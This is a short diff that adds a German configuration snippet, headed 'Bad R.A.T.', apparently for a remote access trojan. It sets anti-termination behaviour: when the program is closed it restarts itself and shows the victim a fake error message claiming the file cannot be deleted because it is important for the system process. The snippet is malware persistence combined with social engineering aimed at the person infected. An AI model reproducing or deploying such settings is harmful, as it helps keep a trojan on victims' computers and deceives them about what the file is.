@@ -1,0 +1,5 @@
+;Event Setting [Bad R.A.T.]
+;Anti-Terminate mit "Bitte" an den VIC, die Datei nicht zuläschen, da diese "wichtig für das System" ist
+;by Mr Hawk
+OnTerminate: StartPath "[%APP]"
+OnTerminate: FakeMsg Error: [%APP] kann nicht gelöscht werden.|Bitte Datei nicht löschen, da diese wichtig für den Systemprozess ist!
